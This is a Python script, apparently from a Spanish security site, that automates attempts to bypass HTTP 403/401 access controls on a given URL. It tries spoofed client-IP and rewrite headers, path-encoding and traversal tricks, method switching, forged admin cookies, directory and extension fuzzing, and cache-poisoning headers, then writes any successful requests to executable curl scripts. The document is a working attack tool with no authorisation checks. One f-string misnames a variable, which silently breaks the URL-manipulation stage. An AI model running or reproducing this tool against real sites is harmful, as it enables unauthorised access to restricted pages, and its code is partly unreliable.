#!/usr/bin/env python3
"""
bypass 403/401 - Solo muestra 200 OK
Autor: hackingyseguridad.com (2026)
Versión: 2.2 - Solo 200 OK con curl
"""

import requests
import argparse
from urllib.parse import urlparse, urljoin, quote
import time
import sys
import os

# Configuración global
requests.packages.urllib3.disable_warnings()
TIMEOUT = 10

class Bypass403:
    def __init__(self, url, proxy=None, headers_file=None, verbose=False):
        self.url = url
        self.parsed_url = urlparse(url)
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
        self.path = self.parsed_url.path
        self.verbose = verbose
        
        # Headers base
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
        }
        
        # Configurar proxy
        self.proxies = {}
        if proxy:
            self.proxies = {'http': proxy, 'https': proxy}
        
        # Resultados con 200 OK
        self.success_results = []
    
    def generate_curl_command(self, method, url, headers=None):
        """Generar comando curl completo"""
        curl_cmd = f"curl -X {method}"
        
        if headers:
            for key, value in headers.items():
                # Escapar comillas
                escaped_value = str(value).replace("'", "'\"'\"'")
                curl_cmd += f" -H '{key}: {escaped_value}'"
        
        curl_cmd += f" '{url}'"
        curl_cmd += " --insecure --connect-timeout 10 --max-time 10"
        
        if self.proxies:
            proxy_url = list(self.proxies.values())[0]
            curl_cmd += f" --proxy '{proxy_url}'"
        
        curl_cmd += " -i -s"  # -s para silencioso, -i para headers
        return curl_cmd
    
    def test_request(self, url, method="GET", headers=None):
        """Realizar petición HTTP"""
        try:
            response = requests.request(
                method=method,
                url=url,
                headers=headers if headers else self.headers,
                proxies=self.proxies,
                verify=False,
                timeout=TIMEOUT,
                allow_redirects=False
            )
            return response
        except Exception:
            return None
    
    def test_and_save_200(self, technique, url, method="GET", headers=None):
        """Ejecutar test y guardar solo si es 200 OK"""
        response = self.test_request(url, method, headers)
        
        if response and response.status_code == 200:
            length = len(response.content)
            curl_cmd = self.generate_curl_command(method, url, headers)
            
            # Extraer título si es HTML
            title = ""
            if 'text/html' in response.headers.get('Content-Type', ''):
                import re
                title_match = re.search(r'<title>(.*?)</title>', response.text, re.IGNORECASE)
                if title_match:
                    title = title_match.group(1)[:100]
            
            result = {
                'technique': technique,
                'url': url,
                'curl': curl_cmd,
                'length': length,
                'title': title
            }
            
            self.success_results.append(result)
            
            # Mostrar inmediatamente
            print(f"\n[✓] 200 OK encontrado!")
            print(f"    Técnica: {technique}")
            print(f"    URL: {url}")
            print(f"    Length: {length} bytes")
            if title:
                print(f"    Title: {title}")
            print(f"\n    Comando CURL:")
            print(f"    {curl_cmd}")
            print("    " + "="*60)
            
            return True
        
        return False
    
    def test_header_bypasses(self):
        """Probar bypass con headers - Solo 200 OK"""
        print("\n[1] Probando Headers HTTP...")
        
        header_tests = [
            ("X-Original-URL", '/anything', {'X-Original-URL': self.path}),
            ("X-Rewrite-URL", '/anything', {'X-Rewrite-URL': self.path}),
            ("X-Forwarded-For: 127.0.0.1", self.url, {'X-Forwarded-For': '127.0.0.1'}),
            ("X-Forwarded-For: localhost", self.url, {'X-Forwarded-For': 'localhost'}),
            ("X-Forwarded-For: 0.0.0.0", self.url, {'X-Forwarded-For': '0.0.0.0'}),
            ("Referer: mismo dominio", self.url, {'Referer': self.base_url}),
            ("Host: localhost", self.url, {'Host': 'localhost'}),
            ("X-Forwarded-Host: localhost", self.url, {'X-Forwarded-Host': 'localhost'}),
            ("X-Custom-IP-Authorization", self.url, {'X-Custom-IP-Authorization': '127.0.0.1'}),
            ("X-Originating-IP", self.url, {'X-Originating-IP': '127.0.0.1'}),
            ("X-Remote-IP", self.url, {'X-Remote-IP': '127.0.0.1'}),
            ("X-Client-IP", self.url, {'X-Client-IP': '127.0.0.1'}),
            ("Content-Length: 0", self.url, {'Content-Length': '0'}),
        ]
        
        for name, endpoint, headers in header_tests:
            test_url = urljoin(self.base_url, endpoint) if endpoint.startswith('/') else endpoint
            self.test_and_save_200(name, test_url, "GET", headers)
    
    def test_url_manipulation(self):
        """Probar manipulación de URLs - Solo 200 OK"""
        print("\n[2] Probando manipulación de URLs...")
        
        url_tests = [
            ("URL Encoding", self.base_url + quote(self.path, safe='')),
            ("Double Encoding", self.base_url + quote(quote(self.path, safe=''), safe='')),
            (f"{self.path}/.", self.base_url + f"{self.path}/."),
            (f"{self.path}..", self.base_url + f"{self.path}.."),
            (f"{self.path}...", self.base_url + f"{self.path}..."),
            (f"//{self.path}", self.base_url + f"//{self.path.lstrip('/')}"),
            (f"{self.path}//", self.base_url + f"{self.path}//"),
            (f"{self.path};", self.base_url + f"{self.path};"),
            (f"{self.path}%20", self.base_url + f"{self.path}%20"),
            (f"{self_path}%09", self.base_url + f"{self.path}%09"),
            (f"{self.path}../", self.base_url + f"{self.path}../"),
            (f"{self.path}..;/", self.base_url + f"{self.path}..;/"),
            (f"{self.path}?", self.base_url + f"{self.path}?"),
            (f"{self.path}??", self.base_url + f"{self.path}??"),
            (f"{self.path}#", self.base_url + f"{self.path}#"),
            (f"{self.path}%00", self.base_url + f"{self.path}%00"),
            (f"{self.path}.css", self.base_url + f"{self.path}.css"),
            (f"{self.path}/..", self.base_url + f"{self.path}/.."),
        ]
        
        for name, test_url in url_tests:
            self.test_and_save_200(name, test_url)
    
    def test_http_methods(self):
        """Probar métodos HTTP - Solo 200 OK"""
        print("\n[3] Probando métodos HTTP...")
        
        methods = [
            ('GET', 'GET'),
            ('POST', 'POST'),
            ('PUT', 'PUT'),
            ('DELETE', 'DELETE'),
            ('PATCH', 'PATCH'),
            ('OPTIONS', 'OPTIONS'),
            ('HEAD', 'HEAD'),
            ('TRACE', 'TRACE'),
        ]
        
        for method_name, method in methods:
            self.test_and_save_200(f"Método HTTP: {method_name}", self.url, method)
    
    def test_parameter_bypass(self):
        """Probar bypass con parámetros - Solo 200 OK"""
        print("\n[4] Probando bypass con parámetros...")
        
        if '?' in self.url:
            base_url, params = self.url.split('?', 1)
            
            param_tests = [
                ("Añadir dummy param", f"{self.url}&dummy=1"),
                ("Añadir test param", f"{self.url}&test=1"),
                ("Duplicar parámetros", f"{self.url}&{params}"),
                ("URL encode todo", f"{base_url}?{quote(params)}"),
                ("Cambiar a array", f"{base_url}?{params.split('=')[0]}[]={params.split('=')[1] if '=' in params else ''}"),
            ]
            
            for name, test_url in param_tests:
                self.test_and_save_200(name, test_url)
    
    def test_extension_fuzzing(self):
        """Probar extensiones - Solo 200 OK"""
        print("\n[5] Probando diferentes extensiones...")
        
        if '.' in self.path:
            base_path = self.path.rsplit('.', 1)[0]
        else:
            base_path = self.path
        
        extensions = [
            '.html', '.htm', '.php', '.php2', '.php3', '.php4', '.php5',
            '.phtml', '.asp', '.aspx', '.jsp', '.json', '.xml', '.txt',
            '.bak', '.old', '.tmp', '.temp', '.swp',
            '.css', '.js', '.jpg', '.png', '.gif',
            '.tar', '.zip', '.gz', '.sql', '.db',
            '.git', '.svn', '.htaccess'
        ]
        
        for ext in extensions:
            test_url = self.base_url + base_path + ext
            self.test_and_save_200(f"Extensión: {ext}", test_url)
    
    def test_protocol_port_bypass(self):
        """Probar puertos - Solo 200 OK"""
        print("\n[6] Probando diferentes puertos...")
        
        host = self.parsed_url.netloc.split(':')[0] if ':' in self.parsed_url.netloc else self.parsed_url.netloc
        
        ports = ['80', '443', '8080', '8443', '8000', '8888', '3000']
        
        for port in ports[:3]:  # Solo probar 3 puertos
            for proto in ['http', 'https']:
                test_url = f"{proto}://{host}:{port}{self.path}"
                self.test_and_save_200(f"{proto} puerto {port}", test_url)
    
    def test_cookie_bypass(self):
        """Probar cookies - Solo 200 OK"""
        print("\n[7] Probando bypass con Cookies...")
        
        cookies = [
            'admin=true',
            'admin=1',
            'authenticated=1',
            'authenticated=true',
            'logged_in=true',
            'logged_in=1',
            'user=admin',
            'user=administrator',
            'role=admin',
            'role=administrator',
            'access=full',
            'auth=1',
            'auth=true',
            'authorized=1',
            'authorized=true',
            'privilege=high',
            'is_admin=true',
            'is_admin=1',
        ]
        
        for cookie in cookies:
            headers = self.headers.copy()
            headers['Cookie'] = cookie
            self.test_and_save_200(f"Cookie: {cookie}", self.url, "GET", headers)
    
    def test_directory_fuzzing(self):
        """Probar directorios - Solo 200 OK"""
        print("\n[8] Probando directorios comunes...")
        
        dirs = [
            '/admin', '/administrator', '/wp-admin', '/wp-login.php',
            '/dashboard', '/control', '/manage', '/backend',
            '/private', '/secret', '/hidden', '/secure',
            '/api', '/v1', '/v2', '/v3', '/internal',
            '/test', '/dev', '/staging', '/demo',
            '/config', '/backup', '/temp', '/tmp',
            '/cgi-bin', '/bin', '/scripts', '/tools',
            '/console', '/shell', '/cmd', '/command',
        ]
        
        for directory in dirs[:20]:  # Limitar a 20 directorios
            test_url = self.base_url + directory
            self.test_and_save_200(f"Directorio: {directory}", test_url)
    
    def test_cache_poisoning(self):
        """Probar cache poisoning - Solo 200 OK"""
        print("\n[9] Probando técnicas de Cache Poisoning...")
        
        cache_tests = [
            ("X-Forwarded-Host: evil.com", self.url, {'X-Forwarded-Host': 'evil.com'}),
            ("X-Forwarded-Scheme: http", self.url, {'X-Forwarded-Scheme': 'http'}),
            ("X-Forwarded-Port: 80", self.url, {'X-Forwarded-Port': '80'}),
            ("X-Original-URL: /", '/', {'X-Original-URL': '/'}),
            ("X-Rewrite-URL: /", '/', {'X-Rewrite-URL': '/'}),
        ]
        
        for name, endpoint, headers in cache_tests:
            test_url = urljoin(self.base_url, endpoint) if endpoint.startswith('/') else endpoint
            self.test_and_save_200(name, test_url, "GET", headers)
    
    def run_all_tests(self):
        """Ejecutar todas las pruebas"""
        print(f"\n{'='*70}")
        print("BY403 - Bypass 403/401 - SOLO 200 OK")
        print(f"{'='*70}")
        print(f"Target: {self.url}")
        print(f"Base URL: {self.base_url}")
        print(f"Path: {self.path}")
        print(f"{'='*70}\n")
        
        start_time = time.time()
        
        # Ejecutar todas las pruebas
        test_functions = [
            self.test_header_bypasses,
            self.test_url_manipulation,
            self.test_http_methods,
            self.test_parameter_bypass,
            self.test_extension_fuzzing,
            self.test_protocol_port_bypass,
            self.test_cookie_bypass,
            self.test_directory_fuzzing,
            self.test_cache_poisoning
        ]
        
        for test_func in test_functions:
            try:
                test_func()
                time.sleep(0.3)  # Pequeña pausa
            except Exception as e:
                if self.verbose:
                    print(f"[!] Error: {e}")
        
        # Mostrar resumen final
        self.show_summary(start_time)
    
    def show_summary(self, start_time):
        """Mostrar resumen final"""
        elapsed = time.time() - start_time
        
        print(f"\n{'='*70}")
        print("RESUMEN FINAL - SOLO 200 OK")
        print(f"{'='*70}")
        
        if self.success_results:
            print(f"\n[+] TOTAL BYPASS 200 OK ENCONTRADOS: {len(self.success_results)}")
            print(f"[+] Tiempo de ejecución: {elapsed:.2f} segundos")
            
            # Guardar todos los comandos curl en archivo
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            curl_file = f"bypass_200ok_{timestamp}.sh"
            
            with open(curl_file, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write(f"# Comandos curl para bypass 200 OK\n")
                f.write(f"# Target: {self.url}\n")
                f.write(f"# Fecha: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Total: {len(self.success_results)} bypass encontrados\n")
                f.write(f"# Tiempo: {elapsed:.2f} segundos\n\n")
                f.write("echo 'Ejecutando comandos curl para bypass 200 OK'\n")
                f.write("echo '=========================================='\n")
                f.write("sleep 2\n\n")
                
                for i, result in enumerate(self.success_results, 1):
                    f.write(f"echo '\\n[{i}] {result['technique']}'\n")
                    f.write(f"echo 'URL: {result['url']}'\n")
                    f.write(f"echo 'Length: {result['length']} bytes'\n")
                    if result['title']:
                        f.write(f"echo 'Title: {result['title']}'\n")
                    f.write(f"{result['curl']}\n")
                    f.write("echo '----------------------------------------'\n")
                    if i < len(self.success_results):
                        f.write("sleep 1\n")
            
            # Hacer el archivo ejecutable
            os.chmod(curl_file, 0o755)
            
            print(f"\n[+] Archivo con comandos curl creado: {curl_file}")
            print(f"[+] Ejecutar: ./{curl_file}")
            
            # También crear archivo de texto simple
            txt_file = f"bypass_200ok_{timestamp}.txt"
            with open(txt_file, 'w') as f:
                f.write(f"# Bypass 200 OK para: {self.url}\n")
                f.write(f"# Fecha: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Total: {len(self.success_results)}\n\n")
                
                for result in self.success_results:
                    f.write(f"# {result['technique']}\n")
                    f.write(f"# URL: {result['url']}\n")
                    f.write(f"# Length: {result['length']} bytes\n")
                    if result['title']:
                        f.write(f"# Title: {result['title']}\n")
                    f.write(f"{result['curl']}\n\n")
            
            print(f"[+] Archivo de texto creado: {txt_file}")
            
            # Mostrar estadísticas
            print(f"\n[+] Estadísticas:")
            print(f"    - Headers bypass: {len([r for r in self.success_results if 'Header' in r['technique'] or 'X-' in r['technique']])}")
            print(f"    - URL manipulation: {len([r for r in self.success_results if 'URL' in r['technique'] or 'Encoding' in r['technique']])}")
            print(f"    - HTTP methods: {len([r for r in self.success_results if 'Método HTTP' in r['technique']])}")
            print(f"    - Cookies: {len([r for r in self.success_results if 'Cookie' in r['technique']])}")
            
        else:
            print(f"\n[!] No se encontraron respuestas 200 OK")
            print(f"[!] Tiempo de ejecución: {elapsed:.2f} segundos")
        
        print(f"\n{'='*70}")

def main():
    banner = """
╔══════════════════════════════════════════════╗
║     BYPASS 403/401 - SOLO 200 OK v2.2        ║
║     Muestra solo respuestas exitosas         ║
╚══════════════════════════════════════════════╝
    """
    print(banner)
    
    parser = argparse.ArgumentParser(description='Bypass 403/401 - Solo muestra 200 OK')
    parser.add_argument('url', help='URL objetivo (ej: http://target.com/admin)')
    parser.add_argument('--proxy', help='Proxy (ej: http://127.0.0.1:8080)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Modo detallado')
    
    args = parser.parse_args()
    
    # Validar URL
    if not args.url.startswith(('http://', 'https://')):
        print("[!] Error: URL debe empezar con http:// o https://")
        sys.exit(1)
    
    # Crear y ejecutar herramienta
    try:
        tool = Bypass403(
            url=args.url,
            proxy=args.proxy,
            verbose=args.verbose
        )
        tool.run_all_tests()
    except KeyboardInterrupt:
        print("\n[!] Interrumpido por el usuario")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
